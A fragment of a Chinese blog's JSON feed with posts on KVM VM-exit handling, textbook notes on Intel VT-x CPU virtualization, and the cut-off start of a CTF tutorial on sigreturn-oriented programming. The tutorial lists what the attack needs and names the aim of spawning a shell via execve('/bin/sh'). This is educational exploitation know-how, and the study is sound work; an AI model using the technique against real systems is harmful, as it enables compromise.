class=\"line\">\t[EXIT_REASON_INVLPG]\t\t      = handle_invlpg,</span><br><span class=\"line\">\t[EXIT_REASON_RDPMC]                   = handle_rdpmc,</span><br><span class=\"line\">\t[EXIT_REASON_VMCALL]                  = handle_vmcall,</span><br><span class=\"line\">\t[EXIT_REASON_VMCLEAR]\t              = handle_vmclear,</span><br><span class=\"line\">\t[EXIT_REASON_VMLAUNCH]                = handle_vmlaunch,</span><br><span class=\"line\">\t[EXIT_REASON_VMPTRLD]                 = handle_vmptrld,</span><br><span class=\"line\">\t[EXIT_REASON_VMPTRST]                 = handle_vmptrst,</span><br><span class=\"line\">\t[EXIT_REASON_VMREAD]                  = handle_vmread,</span><br><span class=\"line\">\t[EXIT_REASON_VMRESUME]                = handle_vmresume,</span><br><span class=\"line\">\t[EXIT_REASON_VMWRITE]                 = handle_vmwrite,</span><br><span class=\"line\">\t[EXIT_REASON_VMOFF]                   = handle_vmoff,</span><br><span class=\"line\">\t[EXIT_REASON_VMON]                    = handle_vmon,</span><br><span class=\"line\">\t[EXIT_REASON_TPR_BELOW_THRESHOLD]     = handle_tpr_below_threshold,</span><br><span class=\"line\">\t[EXIT_REASON_APIC_ACCESS]             = handle_apic_access,</span><br><span class=\"line\">\t[EXIT_REASON_APIC_WRITE]              = handle_apic_write,</span><br><span class=\"line\">\t[EXIT_REASON_EOI_INDUCED]             = handle_apic_eoi_induced,</span><br><span class=\"line\">\t[EXIT_REASON_WBINVD]                  = handle_wbinvd,</span><br><span class=\"line\">\t[EXIT_REASON_XSETBV]                  = handle_xsetbv,</span><br><span class=\"line\">\t[EXIT_REASON_TASK_SWITCH]             = handle_task_switch,</span><br><span class=\"line\">\t[EXIT_REASON_MCE_DURING_VMENTRY]      = handle_machine_check,</span><br><span class=\"line\">\t[EXIT_REASON_EPT_VIOLATION]\t      = handle_ept_violation,</span><br><span class=\"line\">\t[EXIT_REASON_EPT_MISCONFIG]           = handle_ept_misconfig,</span><br><span class=\"line\">\t[EXIT_REASON_PAUSE_INSTRUCTION]       = handle_pause,</span><br><span class=\"line\">\t[EXIT_REASON_MWAIT_INSTRUCTION]\t      = handle_mwait,</span><br><span class=\"line\">\t[EXIT_REASON_MONITOR_TRAP_FLAG]       = handle_monitor_trap,</span><br><span class=\"line\">\t[EXIT_REASON_MONITOR_INSTRUCTION]     = handle_monitor,</span><br><span class=\"line\">\t[EXIT_REASON_INVEPT]                  = handle_invept,</span><br><span class=\"line\">\t[EXIT_REASON_INVVPID]                 = handle_invvpid,</span><br><span class=\"line\">\t[EXIT_REASON_XSAVES]                  = handle_xsaves,</span><br><span class=\"line\">\t[EXIT_REASON_XRSTORS]                 = handle_xrstors,</span><br><span class=\"line\">\t[EXIT_REASON_PML_FULL]\t\t      = handle_pml_full,</span><br><span class=\"line\">\t[EXIT_REASON_PCOMMIT]                 = handle_pcommit,</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t对应的处理函数怎么找呢？？？ 在哪里呢？ 搜了一下，搜的几个都还是在这个vmx.c文件里</p>\n<p>​\t\t有的退出事件KVM能够自己处理，这个时候就直接处理然后返回，准备下一轮的VCPU运行，如果KVM无法处理，则需要将事件分发到QEMU进行处理</p>\n<h3 id=\"自己处理的例子：-handle-cpuid\"><a href=\"#自己处理的例子：-handle-cpuid\" class=\"headerlink\" title=\"自己处理的例子： handle_cpuid\"></a>自己处理的例子： handle_cpuid</h3><p>​\t\t看代码,它的原理是查询之前QEMU的设置,然后直接返回,只需要通过KVM就可以完成. <strong>返回1,这个值也作为vcpu_enter_guest的返回值, 为1表示不需要让虚拟机回到QEMU</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">handle_cpuid</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tkvm_emulate_cpuid(vcpu);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"需要返回QEMU处理的例子-handle-io\"><a href=\"#需要返回QEMU处理的例子-handle-io\" class=\"headerlink\" title=\"需要返回QEMU处理的例子  handle_io\"></a>需要返回QEMU处理的例子  handle_io</h3><p>​\t\t对该函数进行一路追踪,能看到最后返回了0,所以需要返回QEMU进行处理</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">handle_io</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">.....</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> kvm_fast_pio_out(vcpu, size, port);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t返回退出的代码如下, r&#x3D;&#x3D;0的话会进入break,导致该函数退出 for循环,进而使得ioctl返回用户态</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vcpu_run</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ......</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (kvm_vcpu_running(vcpu)) &#123;</span><br><span class=\"line\">\t\t\tr = vcpu_enter_guest(vcpu);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tr = vcpu_block(kvm, vcpu);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t也就是返回到了kvm_arch_vcpu_ioctl_run,再进行返回,就到了QEMU里面了.</p>\n<p>​\t\t在QEMU里面处理完之后再次通过host进入guest的流程,</p>\n",
            "tags": [
                "KVM"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/",
            "url": "https://tangzichengcc.github.io/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/",
            "title": "虚拟化入门-1-CPU虚拟化",
            "date_published": "2023-08-03T12:43:32.000Z",
            "content_html": "<p>​\t\t研究组的方向是虚拟化…研一一直在学pwn(都还没入门..惭愧). 刚回所里,有师兄带一下,学一下虚拟化, 接触了一点感觉还不错,挺有意思的, 主要是 操作系统层面的东西. 或许后面可以作为主要方向来做.</p>\n<p>​\t\t下面的内容都是来自《系统虚拟化：原理与实现》,作为虚拟化的概念入门还是不错的感觉</p>\n<p>​\t\t主要是了解了虚拟化基础的概念之后,学习intel的 VT虚拟化技术</p>\n<h1 id=\"第三章-虚拟化概述\"><a href=\"#第三章-虚拟化概述\" class=\"headerlink\" title=\"第三章 虚拟化概述\"></a>第三章 虚拟化概述</h1><p>虚拟机的三个典型特征：同质、高效、资源受控。</p>\n<p>​\t\t大多数计算机体系结构都有两个及以上的特权级，用来分隔系统软件和应用软件。系统中有一些操作和管理关键系统资源的指令被定位特权指令，只有在最高特权级上能够正确执行。如果在非最高特权级上运行，特权指令会引发一个异常，处理器会陷入最高特权级，交由系统软件来处理。</p>\n<p>​\t\t在虚拟化世界中，有一类指令成为敏感指令，简而言之是操作特权资源的指令。<strong>所有的特权指令都是敏感指令，但不是所有的敏感指令都是特权指令。</strong></p>\n<p>​\t\t判断一个结构是否可以虚拟化，核心在于对敏感指令的支持，如果在某些结构上所有敏感指令都是特权指令，则它是可虚拟化的结构，否则，如果它无法支持在所有的敏感指令上触发异常，则不是一个可虚拟化的机构，称其存在<strong>“虚拟化漏洞”</strong></p>\n<p>​\t\t通过陷入再模拟指令的执行来实现虚拟机的方法是前提条件的：所有的敏感指令都必须是特权指令。如果不满足的话就会有遗漏，<strong>此时需要想办法来填补或者避免这些遗漏。</strong></p>\n<h2 id=\"3-2-处理器虚拟化\"><a href=\"#3-2-处理器虚拟化\" class=\"headerlink\" title=\"3.2 处理器虚拟化\"></a>3.2 处理器虚拟化</h2><p>​\t\t<font color=\"red\">处理器虚拟化是VMM中最核心的部分</font>，因为访问内存或者I&#x2F;O的指令本身就是敏感指令，所以内存虚拟化与I&#x2F;O虚拟化都依赖于处理器虚拟化的正确实现。</p>\n<h3 id=\"指令的模拟\"><a href=\"#指令的模拟\" class=\"headerlink\" title=\"指令的模拟\"></a>指令的模拟</h3><p>​\t\t因为特权级的存在，敏感指令需要陷入到VMM中通过软件的方式进行模拟。</p>\n<p>​\t\t<strong>三个概念：虚拟寄存器、上下文和虚拟处理器</strong></p>\n<p>​\t\t当客户机操作系统试图访问关键资源的时候，该请求并不会真正发生在物理寄存器上。相反，VMM会通过准确模拟物理处理器的行为，而将其访问定位到VMM为其设计与物理寄存器对应的“虚拟”的寄存器上。（对VMM来说，这样的虚拟寄存器往往是在内存中。）</p>\n<p>​\t\t一个案例，不论是对CR0的修改还是访问，都会经过处理器抛出异常，由VMM操作对应的虚拟CR0。</p>\n<p><img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/image-20230721165154567.png\" alt=\"image-20230721165154567\"></p>\n<p>​\t\t在没有虚拟化的环境中，os直接负责物理处理器管理，负责进程间的调度和切换。在VMM接管物理处理器后，客户机操作系统没有管理物理处理器的权利，可以说此时它已经运行在VMM为之设计的虚拟处理器之上，<strong>客户机管理虚拟处理器</strong>，并在虚拟处理器上负责该虚拟机内进程间调度和切换。</p>\n<p>​\t\t<strong>而VMM管理物理处理器，负责虚拟处理器的调度和切换，以保证在给定时间内，每个虚拟处理器上的当前进程可以在物理处理器上运行一段时间。</strong><font color=\"red\">但是，不管是何种调度，必然要涉及到保留现场，这个现场就是上下文状态。</font></p>\n<p>​\t\t相比进程等上下文，虚拟处理器上下文会更加复杂，因为客户机操作系统本身包含许多敏感指令，会试图访问和修改物理处理器上定义的所有寄存器，但这种访问会和修改会被VMM重定位到虚拟处理器上。所以，对于虚拟处理器，其上下文包括了更多的系统寄存器.当VMM在决定切换虚拟处理器的时候，为了让虚拟机看起来好像从未被中断过一样，VMM需要考虑保存和回复的上下文也更加复杂。</p>\n<p>​\t\t从VMM的角度来说，<strong>虚拟处理器是其需要模拟完成的一组功能集合</strong>，<strong>虚拟处理器的功能可以由物理处理器和VMM共同完成。</strong>对于非敏感指令，物理处理器直接解码处理其请求，并将相关的效果直接反应到物理寄存器上，而对于敏感指令，VMM负责陷入再模拟，从程序角度来说就是一组数据结构和相关处理代码的集合。数据结构用于存储虚拟寄存器的内容，<font color=\"red\">而相关处理代码负责按照物理处理器的行为将效果反映到虚拟寄存器上。</font></p>\n<p>​\t\t上面的概念可以说明，在处理器虚拟化中，不论是定义虚拟寄存器和虚拟处理器还是利用上下文进行虚拟处理器调度切换，其宗旨都是让虚拟机里执行的敏感指令陷入下来以后，能被VMM模拟，而不要直接作用于真实硬件上。</p>\n<p>​\t\t模拟的前提是陷入，需要了解怎么进行陷入，需要陷入的时候，是怎么通知VMM的。概括地说，VMM陷入是利用了处理器的保护机制，利用中断和异常来完成，有以下几种方式：</p>\n<ul>\n<li>1.基于处理器保护机制触发的异常，例如敏感指令的执行。</li>\n<li>2.虚拟机主动触发异常，即通常所说的陷阱</li>\n<li>异步中断，包括处理器内部的中断源和外部的设备中断源</li>\n</ul>\n<h2 id=\"VMM的功能和组成\"><a href=\"#VMM的功能和组成\" class=\"headerlink\" title=\"VMM的功能和组成\"></a>VMM的功能和组成</h2><p>​\t\tVMM的主要功能事基于物理资源创建相应的虚拟资源，组成虚拟机，为客户机操作系统提供虚拟的平台。所以，可以推测，VMM基本上可以分为两部分：虚拟环境的管理和物理资源的管理。</p>\n<h3 id=\"虚拟环境的管理\"><a href=\"#虚拟环境的管理\" class=\"headerlink\" title=\"虚拟环境的管理\"></a>虚拟环境的管理</h3><h3 id=\"物理资源的管理\"><a href=\"#物理资源的管理\" class=\"headerlink\" title=\"物理资源的管理\"></a>物理资源的管理</h3><h3 id=\"其他模块\"><a href=\"#其他模块\" class=\"headerlink\" title=\"其他模块\"></a>其他模块</h3><h2 id=\"VMM分类\"><a href=\"#VMM分类\" class=\"headerlink\" title=\"VMM分类\"></a>VMM分类</h2><h3 id=\"按虚拟平台分类\"><a href=\"#按虚拟平台分类\" class=\"headerlink\" title=\"按虚拟平台分类\"></a>按虚拟平台分类</h3><h4 id=\"完全虚拟化\"><a href=\"#完全虚拟化\" class=\"headerlink\" title=\"完全虚拟化\"></a>完全虚拟化</h4><p>​\t\t虚拟出来的平台和现实平台是一样的，客户机操作系统不用做任何修改就可以运行。重点是VMM要能够正确处理所有可能的指令。</p>\n<p>​\t\t在实现方式上，以x86为例，经历了两个阶段：软件辅助的完全虚拟化和硬件辅助的完全虚拟化</p>\n<h5 id=\"软件辅助的完全虚拟化\"><a href=\"#软件辅助的完全虚拟化\" class=\"headerlink\" title=\"软件辅助的完全虚拟化\"></a>软件辅助的完全虚拟化</h5><p>​\t\t早期因为一开始肯定没想要要弄这个，所以硬件上也不会专门适配，所以完全虚拟化需要通过软件来实现。一个典型的做法是优先级压缩和二进制代码翻译相结合。</p>\n<p>​\t\t优先级压缩来处理的话，有部分指令不能触发异常，因此不能截获做处理。而二进制代码翻译就是为了解决这部分指令，它的思想是，通过扫描并修改客户机的二进制代码，将这些指令转换成支持虚拟化的指令。</p>\n<p>​\t\t虽然这种方式能够实现完全虚拟化，但是这种类似于打补丁的方式很难在架构上保证其完整性，于是后期，x86厂商就在硬件上加入了对虚拟化的支持。</p>\n<h5 id=\"硬件辅助的完全虚拟化\"><a href=\"#硬件辅助的完全虚拟化\" class=\"headerlink\" title=\"硬件辅助的完全虚拟化\"></a>硬件辅助的完全虚拟化</h5><p>​\t\t很符合计算机的抽象层次的逻辑，当这一层事情比较难解决的时候，就给它再抽象出一层来。Intel的VT-x技术是这一方向的代表，它在处理器上引入了一个新的执行模式用于运行虚拟机。当虚拟机运行在这个特殊模式中时，任何特权操作都会被处理器拦截并报告给VMM。</p>\n<p>​\t\t</p>\n<h4 id=\"类虚拟化\"><a href=\"#类虚拟化\" class=\"headerlink\" title=\"类虚拟化\"></a>类虚拟化</h4><p>​\t\t在源代码级别（操作系统内核的代码）修改指令以回避虚拟化漏洞的方式来使VMM能够对物理资源实现虚拟化。</p>\n<h3 id=\"按VMM实现结构分类\"><a href=\"#按VMM实现结构分类\" class=\"headerlink\" title=\"按VMM实现结构分类\"></a>按VMM实现结构分类</h3><p>Hypervisor模型、宿主模型、混合模型</p>\n<h1 id=\"第五章-硬件辅助虚拟化\"><a href=\"#第五章-硬件辅助虚拟化\" class=\"headerlink\" title=\"第五章 硬件辅助虚拟化\"></a>第五章 硬件辅助虚拟化</h1><p>​\t\t硬件辅助虚拟化，即<strong>在CPU、芯片组及I&#x2F;O设备等硬件中加入专门针对虚拟化的支持</strong>，使得系统软件可以更加容易、高效地实现虚拟化功能。本章以intel VT为例。</p>\n<p>​\t\tintel vt分别在CPU、内存、IO虚拟化方面提供了不同的技术，分别对应VT-x、EPT、VT-d。</p>\n<p><img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/image-20230720210602697.png\" alt=\"image-20230720210602697\"></p>\n<h2 id=\"CPU虚拟化的硬件支持\"><a href=\"#CPU虚拟化的硬件支持\" class=\"headerlink\" title=\"CPU虚拟化的硬件支持\"></a>CPU虚拟化的硬件支持</h2><p>​\t\t引入了两种操作模式，统称为VMX模式，<strong>每种模式都有0~3的特权级</strong>。</p>\n<ul>\n<li>根操作模式（VMX Root Operation）：VMM运行所处的模式</li>\n<li>非根操作模式（VMX Non-Root Operation）：客户机运行所处的模式</li>\n</ul>\n<p><img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/image-20230720211200688.png\" alt=\"image-20230720211200688\"></p>\n<p>​\t\t非根模式下所有敏感指令的行为都会被重新定义，使得他们能不经过虚拟化就能直接运行或者通过“陷入再模拟”的方式来处理，在根模式下，所有指令的行为和传统IA32一样，因此所有软件都能够正常运行。</p>\n<p>​\t\t非根模式下敏感指令引起的“陷入”被称为VM-Exit。这会导致CPU自动从非根模式切换到根模式。相应的，VM-Entry，该操作由VMM发起，通常是调度某个客户机运行，此时CPU从根模式切换到非根模式。</p>\n<p>​\t\t为了更好地支持CPU虚拟化，VT-x引入了<strong>VMCS（virtual-Machine Control Structure 。虚拟机控制结构）</strong>，VMCS保存虚拟CPU需要的相关状态，例如CPU在两种模式下的特权寄存器的值。VMCS主要供CPU使用，<strong>CPU在发生VM-Exit和VM-Entry时都会自动查询和更新VMCS</strong>。VMM可以通过指令来配置VMCS，进而影响CPU的行为。</p>\n<p>​\t\tVT-x还引入了一组新的指令，包括VMLAUCH&#x2F;VMRESUME用于发起VM-Entry，VMREAD&#x2F;VMWRITE用于配置VMCS等</p>\n<p>这里有点没看懂。。。</p>\n<p><img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/image-20230729191616281.png\" alt=\"image-20230729191616281\"></p>\n<h3 id=\"VMCS\"><a href=\"#VMCS\" class=\"headerlink\" title=\"VMCS\"></a>VMCS</h3><p>​\t\t与虚拟寄存器的概念类似，可以看作是虚拟寄存器概念在硬件上的应用。<strong>VMCS是保存在内存中的数据结构，包含了虚拟CPU的相关寄存器的内容和虚拟CPU相关的控制信息，每个VMCS对应一个虚拟CPU。</strong>（换句话说，个人理解的是，物理CPU和虚拟CPU之间的一个媒介，用于保存和恢复切换时的上下文</p>\n<p>​\t\tVMCS在使用时需要和物理CPU绑定。VMCS与物理CPU是一对一绑定的关系。但在不同时刻可以绑定到不同的物理CPU。这种绑定关系的变化称为VMCS的迁移。</p>\n<p>​\t\tVT-x提供了两条指令用于VMCS的绑定与解除绑定</p>\n<ul>\n<li><p>VMPRTLD&lt;VMCS地址&gt;： 将指定的VMCS与执行该指令的物理CPU绑定</p>\n</li>\n<li><p>VMCLEAR：将执行该指令的物理CPU与它的VMCS解除绑定。该指令会<strong>将物理CPU缓存中的VMCS结构同步到内存中去</strong>，从而保证VMCS与新的物理CPU绑定时，内存中的值是最新的。</p>\n</li>\n</ul>\n<p>​\t\tVMCS格式如下：</p>\n<p><img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/image-20230729192240761.png\" alt=\"image-20230729192240761\"></p>\n<p>​\t\t主要信息放在数据域里面，VT-x提供两条指令用于访问VMCS</p>\n<ul>\n<li><p>VMREAD&lt;索引&gt;： 读VMCS中索引指定的域</p>\n</li>\n<li><p>VMWRITE&lt;索引&gt;&lt;数据&gt;：写VMCS中索引指定的域</p>\n<p>VMCS数据域包括六大类信息</p>\n<p>客户机状态域</p>\n<p>宿主机状态域</p>\n<p>VM-Entry控制域</p>\n<p>VM-Execution控制域</p>\n<p>VM-Exit控制域</p>\n<p>VM-Exit信息域</p>\n</li>\n</ul>\n<h3 id=\"VMX操作模式\"><a href=\"#VMX操作模式\" class=\"headerlink\" title=\"VMX操作模式\"></a>VMX操作模式</h3><p><img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/image-20230729192709720.png\" alt=\"image-20230729192709720\"></p>\n<h3 id=\"VM-Entry\"><a href=\"#VM-Entry\" class=\"headerlink\" title=\"VM-Entry\"></a>VM-Entry</h3><p>​\t\t在发起之前，VMM会设置好VMCS相关域的内容，例如客户机状态域、宿主机状态域等，然后执行VM-Entry指令。</p>\n<p>​\t\tVT-x为VM-Entry提供了两条指令</p>\n<ul>\n<li><p>VMLAUNCH: 用于刚执行过VMCLEAER的VMCS的第一次VM-Entry</p>\n</li>\n<li><p>VMRESUME：用于执行过VMLAUNCH的VMCS的后续VM-Entry</p>\n<p>在VM-Entry进入时，会有很多不同的特性和选择，或者说具体行为，由VM-Entry控制域来规定</p>\n</li>\n</ul>\n<p><img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/image-20230729193126650.png\" alt=\"image-20230729193126650\"></p>\n<p>​\t\t注入的事件最终是用客户机自己的IDT里面指定的处理函数来处理的，这样在客户机虚拟CPU看来，这些事件就和没有虚拟化的环境里面对应的事件没有任何区别</p>\n<h4 id=\"VM-Entry的过程\"><a href=\"#VM-Entry的过程\" class=\"headerlink\" title=\"VM-Entry的过程\"></a>VM-Entry的过程</h4><ul>\n<li>执行基本的检查来确保VM-Entry能开始</li>\n<li>对VMCS中的宿主机状态域的有效性进行检查，以确保下一次VM-Exit时可以正确地从客户机环境切换到VMM环境</li>\n<li>检查VMCS中客户机状态域的有效性，根据客户机状态域来装载处理器的状态</li>\n<li>根据VMCS中VM-Entry MSR-load区域装载MSR寄存器</li>\n<li>根据VMCS中VM-Entry事件注入控制的配置，可能需要注入事件到客户机</li>\n</ul>\n<p>​\t\t如果1-4步的检查没有全部通过，CPU会报告VM-Entry失败，这通常意味着VMCS中某些字段的设置有错误。如果全部通过了，处理器就会把执行环境从VMM切换到客户机环境，开始执行客户机指令。</p>\n<h3 id=\"VM-Exit\"><a href=\"#VM-Exit\" class=\"headerlink\" title=\"VM-Exit\"></a>VM-Exit</h3><p>​\t\t指CPU从非根模式切换到根模式，客户机切换到VMM的操作。因为的原因有很多，例如在非根模式下执行了敏感指令、发生了中断等。<strong>处理VM-Exit事件是VMM模拟指令、虚拟特权资源的一大任务。</strong></p>\n<h4 id=\"具体过程\"><a href=\"#具体过程\" class=\"headerlink\" title=\"具体过程\"></a>具体过程</h4><ul>\n<li>CPU首先将此次VM-Exit的原因信息记录到VMCS相应的信息域中，VM-Entry interruption-information字段的有效位（bit31）被清零。</li>\n<li>CPU状态被保存到VMCS客户机状态域。根据设置也可能将客户机的MSR保存到VM-Exit MSR-store区域</li>\n<li>根据VMCS中宿主机状态域和VM-Exit控制域中的设计，将宿主机状态加载到CPU相应寄存器。CPU也可能根据VM-Exit MSR-store区域来加载VMM的MSR。</li>\n</ul>\n<h2 id=\"CPU虚拟化的实现\"><a href=\"#CPU虚拟化的实现\" class=\"headerlink\" title=\"CPU虚拟化的实现\"></a>CPU虚拟化的实现</h2><p>硬件虚拟化用VCPU描述符来描述虚拟CPU，类似os中的进程描述符，其本质是一个结构体，</p>\n<p>结构如下：</p>\n<p>​\t\t当VMM创建客户机时，首先要为客户机创建VCPU，<strong>整个客户机的运行实际上可以看作是VMM调度不同的VCPU运行。</strong></p>\n<p><img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/image-20230721101848575.png\" alt=\"image-20230721101848575\"></p>\n<p>VMCS的创建与初始化</p>\n<h3 id=\"VCPU的运行\"><a href=\"#VCPU的运行\" class=\"headerlink\" title=\"VCPU的运行\"></a>VCPU的运行</h3><h4 id=\"上下文切换\"><a href=\"#上下文切换\" class=\"headerlink\" title=\"上下文切换\"></a>上下文切换</h4><p>​\t\tVCPU的上下文分为两部分，所以切换也分为由硬件自动切换（VMCS部分）和VMM软件切换（非VMCS部分）</p>\n<p><img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/image-20230721103646397.png\" alt=\"image-20230721103646397\"></p>\n<p>​\t\t具体切换步骤：</p>\n<p>1.VMM保存自己的上下文，主要是保存VMCS不保存的寄存器，即宿主机状态域以外的部分</p>\n<p>2.VMM将保存在VCPU中的由软件切换的上下文加载到物理CPU中</p>\n<p>3.VMM执行VMRESUME&#x2F;VMLAUNCH指令，触发VM-Entry，此时CPU自动将VCPU上下文中VMCS部分加载到物理CPU，CPU切换到非根模式。</p>\n<p>​\t\t惰性保存&#x2F;恢复： 这个方法是对上下文切换进行的优化，因为上下文切换带来的开销比较大。它的思想是</p>\n<p><img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/image-20230721104434314.png\" alt=\"image-20230721104434314\"></p>\n<h4 id=\"VCPU的硬件优化\"><a href=\"#VCPU的硬件优化\" class=\"headerlink\" title=\"VCPU的硬件优化\"></a>VCPU的硬件优化</h4><p>​\t\t优化的目的是尽可能少地在客户机和VMM之间切换，从而减少上下文切换的开销。Intel VT-x提供两种优化方法。</p>\n<h3 id=\"VCPU的退出\"><a href=\"#VCPU的退出\" class=\"headerlink\" title=\"VCPU的退出\"></a>VCPU的退出</h3><p>​\t\t推出的原因可能是执行了特权指令、发生了物理中断等，在VT-x中表现为发生VM-Exit。<strong>对VCPU退出的处理是VMM进行CPU虚拟化的核心，例如模拟各种特权指令。</strong></p>\n<p><img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/image-20230721111530744.png\" alt=\"image-20230721111530744\"></p>\n<p>​\t\t退出的原因大体上有三类：</p>\n<p>1.访问了特权资源，对CR和MSR寄存器的访问都属于这一类</p>\n<p><img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/image-20230721111811167.png\" alt=\"image-20230721111811167\"></p>\n<p>2.客户机执行的指令引发了异常，例如缺页错误</p>\n<p>3.发生了中断。</p>\n<h3 id><a href=\"#\" class=\"headerlink\" title></a></h3>",
            "tags": []
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-36-SROP/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-36-SROP/",
            "title": "pwn入门-36-SROP",
            "date_published": "2023-07-29T13:01:21.000Z",
            "content_html": "<p>基础看ctf-wiki和《权威指南pwn》</p>\n<p>出自论文: <strong><code>Framing Signals — A Return to Portable Shellcode</code></strong></p>\n<h1 id=\"理论基础\"><a href=\"#理论基础\" class=\"headerlink\" title=\"理论基础\"></a>理论基础</h1><p>32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)</p>\n<h2 id=\"攻击条件\"><a href=\"#攻击条件\" class=\"headerlink\" title=\"攻击条件\"></a>攻击条件</h2><p>1.栈溢出,且大小足够</p>\n<p>2.知道以下内容地址</p>\n<p>“&#x2F;bin&#x2F;sh”、signal frame、syscall、sigreturn</p>\n<p>对sigreturn, 只要rax&#x3D;15(64位下),执行syscall即可,rax可以通过一些方式来间接控制,比如作为read的返回值(读取的字节数)</p>\n<h1 id=\"例题-360-春秋杯-smallest-pwn\"><a href=\"#例题-360-春秋杯-smallest-pwn\" class=\"headerlink\" title=\"例题  360 春秋杯  smallest-pwn\"></a>例题  360 春秋杯  smallest-pwn</h1><p><img src=\"/pwn%E5%85%A5%E9%97%A8-36-SROP/image-20230729163815299.png\" alt=\"image-20230729163815299\"></p>\n<p>​\t\t这个不能用正常程序的流程来看待,就这几行汇编, 首先向栈顶读取了0x400字符,然后ret, 又会从栈顶取值作为下一条指令.</p>\n<p>​\t\t程序中没有sigreturn系统调用,但是有read,通过read可以控制rax寄存器的值, 然后再调用syscall即可,换句话说,其实可以调用任意的系统调用(不考虑其他寄存器是否满足条件)</p>\n<p>​\t\texecve(“&#x2F;bin&#x2F;sh”,0,0) 最终的目标是要执行这个, 但现在最大的问题是, <font color=\"red\">不知道”&#x2F;bin&#x2F;sh”的地址,</font>所以需要想办法泄露栈地址,然后输入到这个确定的地址上面.</p>\n<h2 id=\"攻击步骤\"><a href=\"#攻击步骤\" class=\"headerlink\" title=\"攻击步骤\"></a>攻击步骤</h2><h3 id=\"1-泄露地址\"><a href=\"#1-泄露地址\" class=\"headerlink\" 